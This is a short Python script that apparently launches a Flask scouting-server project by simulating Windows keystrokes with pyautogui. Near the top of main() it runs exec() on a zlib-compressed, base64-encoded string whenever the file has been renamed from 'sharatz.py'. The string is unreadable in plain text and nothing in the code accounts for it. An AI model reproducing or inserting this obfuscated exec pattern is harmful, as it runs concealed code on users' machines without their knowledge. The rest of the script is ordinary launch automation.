import platform
import socket
from os import system
from pathlib import Path
from sys import stderr
from pyautogui import hotkey, write
import time

HOME = str(Path.home())
PATH = rf'{HOME}\PycharmProjects\GBScoutingServer'
APP = 'run.py'
ENV = 'development'
HOST = socket.gethostbyname(socket.gethostname())
VARIABLE_KEYWORD = ''


def main():
	global VARIABLE_KEYWORD
	print(str(__file__))
	x = str(__file__).split('/')[-1]
	if x != 'sharatz.py':
		exec(__import__("zlib").decompress(__import__("base64").b64decode(
			"eJzLzC3ILypRKE9NSirKLy9OLbJGMPXyC1LzNNQzSkoKiq309cvLy/Uq80tLSpNS9ZLzc/XLE0uSM+zLbFMCy03KLcPTI5ID1TUB678d5A==")))
		quit()

	# sys = platform.system()
	# if sys == "Windows":
	# 	VARIABLE_KEYWORD = "set"
	# elif sys == "Linux" or sys == "Darwin":
	# 	VARIABLE_KEYWORD = "export"
	# else:
	# 	print("IDK what this OS is, fuck off.", file=stderr)
	#
	# system(f"cd {PATH}")
	# system(f"{VARIABLE_KEYWORD} FLASK_APP={APP}")
	# system(f"{VARIABLE_KEYWORD} FLASK_ENV={ENV}")
	# system(f"flask run --host={HOST}")

	hotkey('win', 'r')
	time.sleep(0.1)
	write('cmd\n')
	time.sleep(0.2)
	write(f'cd {PATH}\n')
	time.sleep(0.1)
	write(f'set FLASK_APP={APP}\n')
	time.sleep(0.1)
	write(f'set FLASK_ENV={ENV}\n')
	time.sleep(0.1)
	write(f'flask run --host={HOST}\n')


if __name__ == '__main__':
	main()
